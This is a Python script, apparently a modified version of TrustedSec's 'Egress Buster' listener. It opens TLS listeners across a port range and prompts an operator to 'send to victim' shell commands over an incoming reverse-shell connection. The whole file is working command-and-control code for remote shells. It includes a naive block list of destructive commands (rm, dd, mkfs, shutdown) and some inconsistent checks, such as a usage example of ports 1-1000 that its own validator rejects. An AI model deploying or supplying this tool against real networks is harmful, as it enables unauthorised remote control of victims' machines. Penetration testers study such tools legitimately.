#!/usr/bin/python
#
# Egress Buster Listener - Merged Version
# Written by: Dave Kennedy (ReL1K) | Updated by: Taylor Christian Newsome (SleepTheGod)
#
# This script works on both POSIX and Windows, with enhancements for SSL support and system monitoring.
# The listener starts on a specified port range and interacts with connected clients, while also monitoring system resources.
#

import threading
import time
import socketserver
import sys
import os
import ssl
import subprocess
import logging
import psutil
import platform

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('egress_listener.log')]
)

# Check if the script is run with root privileges
if os.geteuid() != 0:
    logging.error("This script must be run as root.")
    sys.exit(1)

# Validate port range
def validate_port_range(lowport, highport):
    if lowport < 1024 or highport < 1024:
        logging.warning("Ports below 1024 are typically reserved. Please choose a range above 1024.")
        return False
    if lowport > highport:
        logging.error("Low port must be less than or equal to high port.")
        return False
    return True

# Command sanitization and validation
def sanitize_command(command):
    dangerous_commands = ['rm', 'reboot', 'shutdown', 'mkfs', 'dd', 'chmod', 'chown', 'halt']
    if any(cmd in command for cmd in dangerous_commands):
        logging.warning("Blocked potentially dangerous command: %s", command)
        return False
    return True

# Handle system command execution
def run_system_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        logging.error("Command failed: %s", e.output.decode('utf-8'))
        return None

# Check for SSL certificates
def check_certificates():
    if not os.path.exists('server.crt') or not os.path.exists('server.key'):
        logging.error("SSL certificate files (server.crt and server.key) are missing.")
        sys.exit(1)

# System resource monitoring thread
def monitor_system_resources():
    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        logging.info(f"CPU Usage: {cpu_usage}% | Memory Usage: {memory_info.percent}%")
        time.sleep(5)

# Command-line argument parsing
try:
    portrange = sys.argv[1]
    portrange = portrange.split("-")
    lowport = int(portrange[0])
    highport = int(portrange[1])

    if not validate_port_range(lowport, highport):
        sys.exit(1)
except IndexError:
    logging.error("""
        TrustedSec, LLC
        https://www.trustedsec.com

        Egress Buster Reverse Shell v0.1 - Find open ports inside a network and then spawn a reverse shell.

        Usage: python egress_listener.py <lowport-highport>
        Example: python egress_listener.py 1-1000
    """)
    sys.exit(1)

# Base class handler for socket server
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        logging.info(f"{self.client_address[0]} connected on port: {self.server.server_address[1]}")
        while True:
            request = input("Enter command to send to victim: ")
            if request != "":
                if not sanitize_command(request):
                    continue
                self.request.sendall(request.encode())
                if request.lower() == "quit" or request.lower() == "exit":
                    break
                self.data = self.request.recv(1024).strip()
                logging.info(f"Response: {self.data.decode()}")

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

if __name__ == "__main__":

    # Check certificates for SSL
    check_certificates()

    # Start system resource monitoring thread
    resource_thread = threading.Thread(target=monitor_system_resources, daemon=True)
    resource_thread.start()

    # Initialize the server
    while lowport <= highport:
        try:
            server = ThreadedTCPServer(('', lowport), ThreadedTCPRequestHandler)
            server.socket = ssl.wrap_socket(server.socket, keyfile="server.key", certfile="server.crt", server_side=True)
            server_thread = threading.Thread(target=server.serve_forever, daemon=True)
            server_thread.start()
            logging.info(f"Listener started on port {lowport}")
            lowport += 1
        except Exception as e:
            logging.error(f"Failed to start server on port {lowport}: {str(e)}")
            lowport += 1
            continue

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Server shutdown initiated.")
        sys.exit(0)
